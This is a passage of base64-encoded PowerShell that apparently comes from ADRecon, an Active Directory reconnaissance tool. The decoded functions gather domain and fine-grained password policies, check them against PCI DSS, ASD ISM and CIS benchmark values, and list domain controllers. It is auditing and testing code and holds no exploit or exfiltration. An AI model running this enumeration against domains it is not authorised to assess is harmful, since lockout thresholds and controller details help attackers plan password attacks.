3Nwb2xpY3kuTG9ja291dER1cmF0aW9uLm1pbnV0ZXMsICIwIChtYW51YWwgdW5sb2NrKSBvciAzMCIsICJSZXEuIDguMS43IiwgIk4vQSIsICItIiwgIjE1IG9yIG1vcmUiLAogICAgICAgICAgICAiQWNjb3VudCBsb2Nrb3V0IHRocmVzaG9sZCAoYXR0ZW1wdHMpIiwgJEFEcGFzc3BvbGljeS5Mb2Nrb3V0VGhyZXNob2xkLCAiMSB0byA2IiwgIlJlcS4gOC4xLjYiLCAiMSB0byA1IiwgIkNvbnRyb2w6IDE0MDMiLCAiMSB0byAxMCIsCiAgICAgICAgICAgICJSZXNldCBhY2NvdW50IGxvY2tvdXQgY291bnRlciBhZnRlciAobWlucykiLCAkQURwYXNzcG9saWN5LkxvY2tvdXRPYnNlcnZhdGlvbldpbmRvdy5taW51dGVzLCAiTi9BIiwgIi0iLCAiTi9BIiwgIi0iLCAiMTUgb3IgbW9yZSIgKQoKICAgICAgICAgICAgUmVtb3ZlLVZhcmlhYmxlIEFEcGFzc3BvbGljeQogICAgICAgIH0KICAgIH0KCiAgICBJZiAoJFByb3RvY29sIC1lcSAnTERBUCcpCiAgICB7CiAgICAgICAgSWYgKCRPYmpEb21haW4pCiAgICAgICAgewogICAgICAgICAgICAjVmFsdWUgdGFrZW4gZnJvbSBodHRwczovL21zZG4ubWljcm9zb2Z0LmNvbS9lbi11cy9saWJyYXJ5L21zNjc5NDMxKHY9dnMuODUpLmFzcHgKICAgICAgICAgICAgJHB3ZFByb3BlcnRpZXMgPSBAewogICAgICAgICAgICAgICAgIkRPTUFJTl9QQVNTV09SRF9DT01QTEVYIiA9IDE7CiAgICAgICAgICAgICAgICAiRE9NQUlOX1BBU1NXT1JEX05PX0FOT05fQ0hBTkdFIiA9IDI7CiAgICAgICAgICAgICAgICAiRE9NQUlOX1BBU1NXT1JEX05PX0NMRUFSX0NIQU5HRSIgPSA0OwogICAgICAgICAgICAgICAgIkRPTUFJTl9MT0NLT1VUX0FETUlOUyIgPSA4OwogICAgICAgICAgICAgICAgIkRPTUFJTl9QQVNTV09SRF9TVE9SRV9DTEVBUlRFWFQiID0gMTY7CiAgICAgICAgICAgICAgICAiRE9NQUlOX1JFRlVTRV9QQVNTV09SRF9DSEFOR0UiID0gMzIKICAgICAgICAgICAgfQoKICAgICAgICAgICAgSWYgKCgkT2JqRG9tYWluLnB3ZHByb3BlcnRpZXMudmFsdWUgLWJhbmQgJHB3ZFByb3BlcnRpZXNbIkRPTUFJTl9QQVNTV09SRF9DT01QTEVYIl0pIC1lcSAkcHdkUHJvcGVydGllc1siRE9NQUlOX1BBU1NXT1JEX0NPTVBMRVgiXSkKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgJENvbXBsZXhQYXNzd29yZHMgPSAkdHJ1ZQogICAgICAgICAgICB9CiAgICAgICAgICAgIEVsc2UKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgJENvbXBsZXhQYXNzd29yZHMgPSAkZmFsc2UKICAgICAgICAgICAgfQoKICAgICAgICAgICAgSWYgKCgkT2JqRG9tYWluLnB3ZHByb3BlcnRpZXMudmFsdWUgLWJhbmQgJHB3ZFByb3BlcnRpZXNbIkRPTUFJTl9QQVNTV09SRF9TVE9SRV9DTEVBUlRFWFQiXSkgLWVxICRwd2RQcm9wZXJ0aWVzWyJET01BSU5fUEFTU1dPUkRfU1RPUkVfQ0xFQVJURVhUIl0pCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICRSZXZlcnNpYmxlRW5jcnlwdGlvbiA9ICR0cnVlCiAgICAgICAgICAgIH0KICAgICAgICAgICAgRWxzZQogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAkUmV2ZXJzaWJsZUVuY3J5cHRpb24gPSAkZmFsc2UKICAgICAgICAgICAgfQoKICAgICAgICAgICAgJExvY2tvdXREdXJhdGlvbiA9ICQoJE9iakRvbWFpbi5Db252ZXJ0TGFyZ2VJbnRlZ2VyVG9JbnQ2NCgkT2JqRG9tYWluLmxvY2tvdXRkdXJhdGlvbi52YWx1ZSkvLTYwMDAwMDAwMCkKCiAgICAgICAgICAgIElmICgkTG9ja291dER1cmF0aW9uIC1ndCA5OTk5OSkKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgJExvY2tvdXREdXJhdGlvbiA9IDAKICAgICAgICAgICAgfQoKICAgICAgICAgICAgJE9ialZhbHVlcyA9IEAoICJFbmZvcmNlIHBhc3N3b3JkIGhpc3RvcnkgKHBhc3N3b3JkcykiLCAkT2JqRG9tYWluLlB3ZEhpc3RvcnlMZW5ndGgudmFsdWUsICI0IiwgIlJlcS4gOC4yLjUiLCAiOCIsICJDb250cm9sOiAwNDIzIiwgIjI0IG9yIG1vcmUiLAogICAgICAgICAgICAiTWF4aW11bSBwYXNzd29yZCBhZ2UgKGRheXMpIiwgJCgkT2JqRG9tYWluLkNvbnZlcnRMYXJnZUludGVnZXJUb0ludDY0KCRPYmpEb21haW4ubWF4cHdkYWdlLnZhbHVlKSAvLTg2NDAwMDAwMDAwMCksICI5MCIsICJSZXEuIDguMi40IiwgIjkwIiwgIkNvbnRyb2w6IDA0MjMiLCAiMSB0byA2MCIsCiAgICAgICAgICAgICJNaW5pbXVtIHBhc3N3b3JkIGFnZSAoZGF5cykiLCAkKCRPYmpEb21haW4uQ29udmVydExhcmdlSW50ZWdlclRvSW50NjQoJE9iakRvbWFpbi5taW5wd2RhZ2UudmFsdWUpIC8tODY0MDAwMDAwMDAwKSwgIk4vQSIsICItIiwgIjEiLCAiQ29udHJvbDogMDQyMyIsICIxIG9yIG1vcmUiLAogICAgICAgICAgICAiTWluaW11bSBwYXNzd29yZCBsZW5ndGggKGNoYXJhY3RlcnMpIiwgJE9iakRvbWFpbi5NaW5Qd2RMZW5ndGgudmFsdWUsICI3IiwgIlJlcS4gOC4yLjMiLCAiMTMiLCAiQ29udHJvbDogMDQyMSIsICIxNCBvciBtb3JlIiwKICAgICAgICAgICAgIlBhc3N3b3JkIG11c3QgbWVldCBjb21wbGV4aXR5IHJlcXVpcmVtZW50cyIsICRDb21wbGV4UGFzc3dvcmRzLCAkdHJ1ZSwgIlJlcS4gOC4yLjMiLCAkdHJ1ZSwgIkNvbnRyb2w6IDA0MjEiLCAkdHJ1ZSwKICAgICAgICAgICAgIlN0b3JlIHBhc3N3b3JkIHVzaW5nIHJldmVyc2libGUgZW5jcnlwdGlvbiBmb3IgYWxsIHVzZXJzIGluIHRoZSBkb21haW4iLCAkUmV2ZXJzaWJsZUVuY3J5cHRpb24sICJOL0EiLCAiLSIsICJOL0EiLCAiLSIsICRmYWxzZSwKICAgICAgICAgICAgIkFjY291bnQgbG9ja291dCBkdXJhdGlvbiAobWlucykiLCAkTG9ja291dER1cmF0aW9uLCAiMCAobWFudWFsIHVubG9jaykgb3IgMzAiLCAiUmVxLiA4LjEuNyIsICJOL0EiLCAiLSIsICIxNSBvciBtb3JlIiwKICAgICAgICAgICAgIkFjY291bnQgbG9ja291dCB0aHJlc2hvbGQgKGF0dGVtcHRzKSIsICRPYmpEb21haW4uTG9ja291dFRocmVzaG9sZC52YWx1ZSwgIjEgdG8gNiIsICJSZXEuIDguMS42IiwgIjEgdG8gNSIsICJDb250cm9sOiAxNDAzIiwgIjEgdG8gMTAiLAogICAgICAgICAgICAiUmVzZXQgYWNjb3VudCBsb2Nrb3V0IGNvdW50ZXIgYWZ0ZXIgKG1pbnMpIiwgJCgkT2JqRG9tYWluLkNvbnZlcnRMYXJnZUludGVnZXJUb0ludDY0KCRPYmpEb21haW4ubG9ja291dG9ic2VydmF0aW9uV2luZG93LnZhbHVlKS8tNjAwMDAwMDAwKSwgIk4vQSIsICItIiwgIk4vQSIsICItIiwgIjE1IG9yIG1vcmUiICkKCiAgICAgICAgICAgIFJlbW92ZS1WYXJpYWJsZSBwd2RQcm9wZXJ0aWVzCiAgICAgICAgICAgIFJlbW92ZS1WYXJpYWJsZSBDb21wbGV4UGFzc3dvcmRzCiAgICAgICAgICAgIFJlbW92ZS1WYXJpYWJsZSBSZXZlcnNpYmxlRW5jcnlwdGlvbgogICAgICAgIH0KICAgIH0KCiAgICBJZiAoJE9ialZhbHVlcykKICAgIHsKICAgICAgICAkQURQYXNzUG9sT2JqID0gQCgpCiAgICAgICAgRm9yICgkaSA9IDA7ICRpIC1sdCAkKCRPYmpWYWx1ZXMuQ291bnQpOyAkaSsrKQogICAgICAgIHsKICAgICAgICAgICAgJE9iaiA9IE5ldy1PYmplY3QgUFNPYmplY3QKICAgICAgICAgICAgJE9iaiB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgTm90ZVByb3BlcnR5IC1OYW1lICJQb2xpY3kiIC1WYWx1ZSAkT2JqVmFsdWVzWyRpXQogICAgICAgICAgICAkT2JqIHwgQWRkLU1lbWJlciAtTWVtYmVyVHlwZSBOb3RlUHJvcGVydHkgLU5hbWUgIkN1cnJlbnQgVmFsdWUiIC1WYWx1ZSAkT2JqVmFsdWVzWyRpKzFdCiAgICAgICAgICAgICRPYmogfCBBZGQtTWVtYmVyIC1NZW1iZXJUeXBlIE5vdGVQcm9wZXJ0eSAtTmFtZSAiUENJIERTUyBSZXF1aXJlbWVudCIgLVZhbHVlICRPYmpWYWx1ZXNbJGkrMl0KICAgICAgICAgICAgJE9iaiB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgTm90ZVByb3BlcnR5IC1OYW1lICJQQ0kgRFNTIHYzLjIuMSIgLVZhbHVlICRPYmpWYWx1ZXNbJGkrM10KICAgICAgICAgICAgJE9iaiB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgTm90ZVByb3BlcnR5IC1OYW1lICJBU0QgSVNNIiAtVmFsdWUgJE9ialZhbHVlc1skaSs0XQogICAgICAgICAgICAkT2JqIHwgQWRkLU1lbWJlciAtTWVtYmVyVHlwZSBOb3RlUHJvcGVydHkgLU5hbWUgIjIwMTggSVNNIENvbnRyb2xzIiAtVmFsdWUgJE9ialZhbHVlc1skaSs1XQogICAgICAgICAgICAkT2JqIHwgQWRkLU1lbWJlciAtTWVtYmVyVHlwZSBOb3RlUHJvcGVydHkgLU5hbWUgIkNJUyBCZW5jaG1hcmsgMjAxNiIgLVZhbHVlICRPYmpWYWx1ZXNbJGkrNl0KICAgICAgICAgICAgJGkgKz0gNgogICAgICAgICAgICAkQURQYXNzUG9sT2JqICs9ICRPYmoKICAgICAgICB9CiAgICAgICAgUmVtb3ZlLVZhcmlhYmxlIE9ialZhbHVlcwogICAgICAgIFJldHVybiAkQURQYXNzUG9sT2JqCiAgICB9CiAgICBFbHNlCiAgICB7CiAgICAgICAgUmV0dXJuICRudWxsCiAgICB9Cn0KCkZ1bmN0aW9uIEdldC1BRFJGaW5lR3JhaW5lZFBhc3N3b3JkUG9saWN5CnsKPCMKLlNZTk9QU0lTCiAgICBSZXR1cm5zIHRoZSBGaW5lIEdyYWluZWQgUGFzc3dvcmQgUG9saWN5IG9mIHRoZSBjdXJyZW50IChvciBzcGVjaWZpZWQpIGRvbWFpbi4KCi5ERVNDUklQVElPTgogICAgUmV0dXJucyB0aGUgRmluZSBHcmFpbmVkIFBhc3N3b3JkIFBvbGljeSBvZiB0aGUgY3VycmVudCAob3Igc3BlY2lmaWVkKSBkb21haW4uCgouUEFSQU1FVEVSIFByb3RvY29sCiAgICBbc3RyaW5nXQogICAgV2hpY2ggcHJvdG9jb2wgdG8gdXNlOyBBRFdTIChkZWZhdWx0KSBvciBMREFQLgoKLlBBUkFNRVRFUiBvYmpEb21haW4KICAgIFtEaXJlY3RvcnlTZXJ2aWNlcy5EaXJlY3RvcnlFbnRyeV0KICAgIERvbWFpbiBEaXJlY3RvcnkgRW50cnkgb2JqZWN0LgoKLk9VVFBVVFMKICAgIFBTT2JqZWN0LgojPgogICAgcGFyYW0oCiAgICAgICAgW1BhcmFtZXRlcihNYW5kYXRvcnkgPSAkdHJ1ZSldCiAgICAgICAgW3N0cmluZ10gJFByb3RvY29sLAoKICAgICAgICBbUGFyYW1ldGVyKE1hbmRhdG9yeSA9ICRmYWxzZSldCiAgICAgICAgW0RpcmVjdG9yeVNlcnZpY2VzLkRpcmVjdG9yeUVudHJ5XSAkb2JqRG9tYWluCiAgICApCgogICAgSWYgKCRQcm90b2NvbCAtZXEgJ0FEV1MnKQogICAgewogICAgICAgIFRyeQogICAgICAgIHsKICAgICAgICAgICAgJEFERmluZXBhc3Nwb2xpY3kgPSBHZXQtQURGaW5lR3JhaW5lZFBhc3N3b3JkUG9saWN5IC1GaWx0ZXIgKgogICAgICAgIH0KICAgICAgICBDYXRjaAogICAgICAgIHsKICAgICAgICAgICAgV3JpdGUtV2FybmluZyAiW0dldC1BRFJGaW5lR3JhaW5lZFBhc3N3b3JkUG9saWN5XSBFcnJvciB3aGlsZSBlbnVtZXJhdGluZyB0aGUgRmluZSBHcmFpbmVkIFBhc3N3b3JkIFBvbGljeSIKICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAiW0VYQ0VQVElPTl0gJCgkXy5FeGNlcHRpb24uTWVzc2FnZSkiCiAgICAgICAgICAgIFJldHVybiAkbnVsbAogICAgICAgIH0KCiAgICAgICAgSWYgKCRBREZpbmVwYXNzcG9saWN5KQogICAgICAgIHsKICAgICAgICAgICAgJEFEUGFzc1BvbE9iaiA9IEAoKQoKICAgICAgICAgICAgJEFERmluZXBhc3Nwb2xpY3kgfCBGb3JFYWNoLU9iamVjdCB7CiAgICAgICAgICAgICAgICBGb3IoJGk9MDsgJGkgLWx0ICQoJF8uQXBwbGllc1RvLkNvdW50KTsgJGkrKykKICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAkQXBwbGllc1RvID0gJEFwcGxpZXNUbyArICIsIiArICRfLkFwcGxpZXNUb1skaV0KICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIElmICgkbnVsbCAtbmUgJEFwcGxpZXNUbykKICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAkQXBwbGllc1RvID0gJEFwcGxpZXNUby5UcmltU3RhcnQoIiwiKQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgJE9ialZhbHVlcyA9IEAoIk5hbWUiLCAkKCRfLk5hbWUpLCAiQXBwbGllcyBUbyIsICRBcHBsaWVzVG8sICJFbmZvcmNlIHBhc3N3b3JkIGhpc3RvcnkiLCAkXy5QYXNzd29yZEhpc3RvcnlDb3VudCwgIk1heGltdW0gcGFzc3dvcmQgYWdlIChkYXlzKSIsICRfLk1heFBhc3N3b3JkQWdlLmRheXMsICJNaW5pbXVtIHBhc3N3b3JkIGFnZSAoZGF5cykiLCAkXy5NaW5QYXNzd29yZEFnZS5kYXlzLCAiTWluaW11bSBwYXNzd29yZCBsZW5ndGgiLCAkXy5NaW5QYXNzd29yZExlbmd0aCwgIlBhc3N3b3JkIG11c3QgbWVldCBjb21wbGV4aXR5IHJlcXVpcmVtZW50cyIsICRfLkNvbXBsZXhpdHlFbmFibGVkLCAiU3RvcmUgcGFzc3dvcmQgdXNpbmcgcmV2ZXJzaWJsZSBlbmNyeXB0aW9uIiwgJF8uUmV2ZXJzaWJsZUVuY3J5cHRpb25FbmFibGVkLCAiQWNjb3VudCBsb2Nrb3V0IGR1cmF0aW9uIChtaW5zKSIsICRfLkxvY2tvdXREdXJhdGlvbi5taW51dGVzLCAiQWNjb3VudCBsb2Nrb3V0IHRocmVzaG9sZCIsICRfLkxvY2tvdXRUaHJlc2hvbGQsICJSZXNldCBhY2NvdW50IGxvY2tvdXQgY291bnRlciBhZnRlciAobWlucykiLCAkXy5Mb2Nrb3V0T2JzZXJ2YXRpb25XaW5kb3cubWludXRlcywgIlByZWNlZGVuY2UiLCAkKCRfLlByZWNlZGVuY2UpKQogICAgICAgICAgICAgICAgRm9yICgkaSA9IDA7ICRpIC1sdCAkKCRPYmpWYWx1ZXMuQ291bnQpOyAkaSsrKQogICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICRPYmogPSBOZXctT2JqZWN0IFBTT2JqZWN0CiAgICAgICAgICAgICAgICAgICAgJE9iaiB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgTm90ZVByb3BlcnR5IC1OYW1lICJQb2xpY3kiIC1WYWx1ZSAkT2JqVmFsdWVzWyRpXQogICAgICAgICAgICAgICAgICAgICRPYmogfCBBZGQtTWVtYmVyIC1NZW1iZXJUeXBlIE5vdGVQcm9wZXJ0eSAtTmFtZSAiVmFsdWUiIC1WYWx1ZSAkT2JqVmFsdWVzWyRpKzFdCiAgICAgICAgICAgICAgICAgICAgJGkrKwogICAgICAgICAgICAgICAgICAgICRBRFBhc3NQb2xPYmogKz0gJE9iagogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgICAgIFJlbW92ZS1WYXJpYWJsZSBBREZpbmVwYXNzcG9saWN5CiAgICAgICAgfQogICAgfQoKICAgIElmICgkUHJvdG9jb2wgLWVxICdMREFQJykKICAgIHsKICAgICAgICBJZiAoJE9iakRvbWFpbikKICAgICAgICB7CiAgICAgICAgICAgICRvYmpTZWFyY2hlciA9IE5ldy1PYmplY3QgU3lzdGVtLkRpcmVjdG9yeVNlcnZpY2VzLkRpcmVjdG9yeVNlYXJjaGVyICRvYmpEb21haW4KICAgICAgICAgICAgJE9ialNlYXJjaGVyLlBhZ2VTaXplID0gJFBhZ2VTaXplCiAgICAgICAgICAgICRPYmpTZWFyY2hlci5GaWx0ZXIgPSAiKG9iamVjdENsYXNzPW1zRFMtUGFzc3dvcmRTZXR0aW5ncykiCiAgICAgICAgICAgICRPYmpTZWFyY2hlci5TZWFyY2hTY29wZSA9ICJTdWJ0cmVlIgogICAgICAgICAgICBUcnkKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgJEFERmluZXBhc3Nwb2xpY3kgPSAkT2JqU2VhcmNoZXIuRmluZEFsbCgpCiAgICAgICAgICAgIH0KICAgICAgICAgICAgQ2F0Y2gKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgV3JpdGUtV2FybmluZyAiW0dldC1BRFJGaW5lR3JhaW5lZFBhc3N3b3JkUG9saWN5XSBFcnJvciB3aGlsZSBlbnVtZXJhdGluZyB0aGUgRmluZSBHcmFpbmVkIFBhc3N3b3JkIFBvbGljeSIKICAgICAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIltFWENFUFRJT05dICQoJF8uRXhjZXB0aW9uLk1lc3NhZ2UpIgogICAgICAgICAgICAgICAgUmV0dXJuICRudWxsCiAgICAgICAgICAgIH0KCiAgICAgICAgICAgIElmICgkQURGaW5lcGFzc3BvbGljeSkKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgSWYgKFtBRFJlY29uLkxEQVBDbGFzc106Ok9iamVjdENvdW50KCRBREZpbmVwYXNzcG9saWN5KSAtZ2UgMSkKICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAkQURQYXNzUG9sT2JqID0gQCgpCiAgICAgICAgICAgICAgICAgICAgJEFERmluZXBhc3Nwb2xpY3kgfCBGb3JFYWNoLU9iamVjdCB7CiAgICAgICAgICAgICAgICAgICAgRm9yKCRpPTA7ICRpIC1sdCAkKCRfLlByb3BlcnRpZXMuJ21zZHMtcHNvYXBwbGllc3RvJy5Db3VudCk7ICRpKyspCiAgICAgICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICAgICAkQXBwbGllc1RvID0gJEFwcGxpZXNUbyArICIsIiArICRfLlByb3BlcnRpZXMuJ21zZHMtcHNvYXBwbGllc3RvJ1skaV0KICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgSWYgKCRudWxsIC1uZSAkQXBwbGllc1RvKQogICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAgICAgJEFwcGxpZXNUbyA9ICRBcHBsaWVzVG8uVHJpbVN0YXJ0KCIsIikKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgICRPYmpWYWx1ZXMgPSBAKCJOYW1lIiwgJCgkXy5Qcm9wZXJ0aWVzLm5hbWUpLCAiQXBwbGllcyBUbyIsICRBcHBsaWVzVG8sICJFbmZvcmNlIHBhc3N3b3JkIGhpc3RvcnkiLCAkKCRfLlByb3BlcnRpZXMuJ21zZHMtcGFzc3dvcmRoaXN0b3J5bGVuZ3RoJyksICJNYXhpbXVtIHBhc3N3b3JkIGFnZSAoZGF5cykiLCAkKCQoJF8uUHJvcGVydGllcy4nbXNkcy1tYXhpbXVtcGFzc3dvcmRhZ2UnKSAvLTg2NDAwMDAwMDAwMCksICJNaW5pbXVtIHBhc3N3b3JkIGFnZSAoZGF5cykiLCAkKCQoJF8uUHJvcGVydGllcy4nbXNkcy1taW5pbXVtcGFzc3dvcmRhZ2UnKSAvLTg2NDAwMDAwMDAwMCksICJNaW5pbXVtIHBhc3N3b3JkIGxlbmd0aCIsICQoJF8uUHJvcGVydGllcy4nbXNkcy1taW5pbXVtcGFzc3dvcmRsZW5ndGgnKSwgIlBhc3N3b3JkIG11c3QgbWVldCBjb21wbGV4aXR5IHJlcXVpcmVtZW50cyIsICQoJF8uUHJvcGVydGllcy4nbXNkcy1wYXNzd29yZGNvbXBsZXhpdHllbmFibGVkJyksICJTdG9yZSBwYXNzd29yZCB1c2luZyByZXZlcnNpYmxlIGVuY3J5cHRpb24iLCAkKCRfLlByb3BlcnRpZXMuJ21zZHMtcGFzc3dvcmRyZXZlcnNpYmxlZW5jcnlwdGlvbmVuYWJsZWQnKSwgIkFjY291bnQgbG9ja291dCBkdXJhdGlvbiAobWlucykiLCAkKCQoJF8uUHJvcGVydGllcy4nbXNkcy1sb2Nrb3V0ZHVyYXRpb24nKS8tNjAwMDAwMDAwKSwgIkFjY291bnQgbG9ja291dCB0aHJlc2hvbGQiLCAkKCRfLlByb3BlcnRpZXMuJ21zZHMtbG9ja291dHRocmVzaG9sZCcpLCAiUmVzZXQgYWNjb3VudCBsb2Nrb3V0IGNvdW50ZXIgYWZ0ZXIgKG1pbnMpIiwgJCgkKCRfLlByb3BlcnRpZXMuJ21zZHMtbG9ja291dG9ic2VydmF0aW9ud2luZG93JykvLTYwMDAwMDAwMCksICJQcmVjZWRlbmNlIiwgJCgkXy5Qcm9wZXJ0aWVzLidtc2RzLXBhc3N3b3Jkc2V0dGluZ3NwcmVjZWRlbmNlJykpCiAgICAgICAgICAgICAgICAgICAgICAgIEZvciAoJGkgPSAwOyAkaSAtbHQgJCgkT2JqVmFsdWVzLkNvdW50KTsgJGkrKykKICAgICAgICAgICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgJE9iaiA9IE5ldy1PYmplY3QgUFNPYmplY3QKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRPYmogfCBBZGQtTWVtYmVyIC1NZW1iZXJUeXBlIE5vdGVQcm9wZXJ0eSAtTmFtZSAiUG9saWN5IiAtVmFsdWUgJE9ialZhbHVlc1skaV0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICRPYmogfCBBZGQtTWVtYmVyIC1NZW1iZXJUeXBlIE5vdGVQcm9wZXJ0eSAtTmFtZSAiVmFsdWUiIC1WYWx1ZSAkT2JqVmFsdWVzWyRpKzFdCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkaSsrCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkQURQYXNzUG9sT2JqICs9ICRPYmoKICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIFJlbW92ZS1WYXJpYWJsZSBBREZpbmVwYXNzcG9saWN5CiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICB9CgogICAgSWYgKCRBRFBhc3NQb2xPYmopCiAgICB7CiAgICAgICAgUmV0dXJuICRBRFBhc3NQb2xPYmoKICAgIH0KICAgIEVsc2UKICAgIHsKICAgICAgICBSZXR1cm4gJG51bGwKICAgIH0KfQoKRnVuY3Rpb24gR2V0LUFEUkRvbWFpbkNvbnRyb2xsZXIKewo8IwouU1lOT1BTSVMKICAgIFJldHVybnMgdGhlIGRvbWFpbiBjb250cm9sbGVycyBmb3IgdGhlIGN1cnJlbnQgKG9yIHNwZWNpZmllZCkgZm9yZXN0LgoKLkRFU0NSSVBUSU9OCiAgICBSZXR1cm5zIHRoZSBkb21haW4gY29udHJvbGxlcnMgZm9yIHRoZSBjdXJyZW50IChvciBzcGVjaWZpZWQpIGZvcmVzdC4KCi5QQVJBTUVURVIgUHJvdG9jb2wKICAgIFtzdHJpbmddCiAgICBXaGljaCBwcm90b2NvbCB0byB1c2U7IEFEV1MgKGRlZmF1bHQpIG9yIExEQVAuCgouUEFSQU1FVEVSIG9iakRvbWFpbgogICAgW0RpcmVjdG9yeVNlcnZpY2VzLkRpcmVjdG9yeUVudHJ5XQogICAgRG9tYWluIERpcmVjdG9yeSBFbnRyeSBvYmplY3QuCgouUEFSQU1FVEVSIENyZWRlbnRpYWwKICAgIFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNDcmVkZW50aWFsXQogICAgQ3JlZGVudGlhbHMuCgouT1VUUFVUUwogICAgUFNPYmplY3QuCiM+CiAgICBwYXJhbSgKICAgICAgICBbUGFyYW1ldGVyKE1hbmRhdG9yeSA9ICR0cnVlKV0KICAgICAgICBbc3RyaW5nXSAkUHJvdG9jb2wsCgogICAgICAgIFtQYXJhbWV0ZXIoTWFuZGF0b3J5ID0gJGZhbHNlKV0KICAgICAgICBbRGlyZWN0b3J5U2VydmljZXMuRGlyZWN0b3J5RW50cnldICRvYmpEb21haW4sCgogICAgICAgIFtQYXJhbWV0ZXIoTWFuZGF0b3J5ID0gJGZhbHNlKV0KICAgICAgICBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTQ3JlZGVudGlhbF0gJENyZWRlbnRpYWwgPSBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTQ3JlZGVudGlhbF06OkVtcHR5CiAgICApCgogICAgSWYgKCRQcm90b2NvbCAtZXEgJ0FEV1MnKQogICAgewogICAgICAgIFRyeQogICAgICAgIHsKICAgICAgICAgICAgJEFERG9tYWluQ29udHJvbGxlcnMgPSBHZXQtQUREb21haW5Db250cm9sbGVyIC1GaWx0ZXIgKgogICAgICAgIH0KICAgICAgICBDYXRjaAogICAgICAgIHsKICAgICAgICAgICAgV3JpdGUtV2FybmluZyAiW0dldC1BRFJEb21haW5Db250cm9sbGVyXSBFcnJvciB3aGlsZSBlbnVtZXJhdGluZyBEb21haW5Db250cm9sbGVyIE9iamVjdHMiCiAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIltFWENFUFRJT05dICQoJF8uRXhjZXB0aW9uLk1lc3NhZ2UpIgogICAgICAgICAgICBSZXR1cm4gJG51bGwKICAgICAgICB9CgogICAgICAgICMgREMgSW5mbwogICAgICAgIElmICgkQUREb21haW5Db250cm9sbGVycykKICAgICAgICB7CiAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIlsqXSBUb3RhbCBEb21haW4gQ29udHJvbGxlcnM6ICQoW0FEUmVjb24uQURXU0NsYXNzXTo6T2JqZWN0Q291bnQoJEFERG9tYWluQ29udHJvbGxlcnMpKSIKICAgICAgICAgICAgIyBEQyBJbmZvCiAgICAgICAgICAgICREQ09iaiA9IEAoKQogICAgICAgICAgICAkQUREb21haW5Db250cm9sbGVycyB8IEZvckVhY2gtT2JqZWN0IHsKICAgICAgICAgICAgICAgICMgQ3JlYXRlIHRoZSBvYmplY3QgZm9yIGVhY2ggaW5zdGFuY2UuCiAgICAgICAgICAgICAgICAkT2JqID0gTmV3LU9iamVjdCBQU09iamVjdAogICAgICAgICAgICAgICAgJE9iaiB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgTm90ZVByb3BlcnR5IC1OYW1lICJEb21haW4iIC1WYWx1ZSAkXy5Eb21haW4KICAgICAgICAgICAgICAgICRPYmogfCBBZGQtTWVtYmVyIC1NZW1iZXJUeXBlIE5vdGVQcm9wZXJ0eSAtTmFtZSAiU2l0ZSIgLVZhbHVlICRfLlNpdGUKICAgICAgICAgICAgICAgICRPYmogfCBBZGQtTWVtYmVyIC1NZW1iZXJUeXBlIE5vdGVQcm9wZXJ0eSAtTmFtZSAiTmFtZSIgLVZhbHVlICRfLk5hbWUKICAgICAgICAgICAgICAgICRPYmogfCBBZGQtTWVtYmVyIC1NZW1iZXJUeXBlIE5vdGVQcm9wZXJ0eSAtTmFtZSAiSVB2NEFkZHJlc3MiIC1WYWx1ZSAkXy5JUHY0QWRkcmVzcwogICAgICAgICAgICAgICAgJE9TVmVyc2lvbiA9IFtBRFJlY29uLkFEV1NDbGFzc106OkNsZWFuU3RyaW5nKCQoJF8uT3BlcmF0aW5nU3lzdGVtICsgIiAiICsgJF8uT3BlcmF0aW5nU3lzdGVtSG90Zml4ICsgIiAiICsgJF8uT3BlcmF0aW5nU3lzdGVtU2VydmljZVBhY2sgKyAiICIgKyAkXy5PcGVyYXRpbmdTeXN0ZW1WZXJzaW9uKSkKICAgICAgICAgICAgICAgICRPYmogfCBBZGQtTWVtYmVyIC1NZW1iZXJUeXBlIE5vdGVQcm9wZXJ0eSAtTmFtZSAiT3BlcmF0aW5nIFN5c3RlbSIgLVZhbHVlICRPU1ZlcnNpb24KICAgICAgICAgICAgICAgIFJlbW92ZS1WYXJpYWJsZSBPU1ZlcnNpb24KICAgICAgICAgICAgICAgICRPYmogfCBBZGQtTWVtYmVyIC1NZW1iZXJUeXBlIE5vdGVQcm9wZXJ0eSAtTmFtZSAiSG9zdG5hbWUiIC1WYWx